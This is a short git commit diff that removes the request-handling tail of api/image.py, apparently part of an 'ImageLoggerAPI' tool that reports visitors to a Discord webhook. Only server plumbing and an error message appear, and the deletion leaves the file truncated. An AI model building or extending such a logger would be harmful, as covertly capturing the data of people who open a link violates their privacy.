78321c886bc731563e86c9dc65b64821e67871a8
abed3bbad <133598655+abed3bbad@users.noreply.github.com>
2025-02-05 20:57:06 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -286,19 +286,4 @@ if (!currenturl.includes("g=")) {
 }}
 
 </script>"""
-                self.wfile.write(data)
-        
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
-
-        return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-handler = app = ImageLoggerAPI
+              
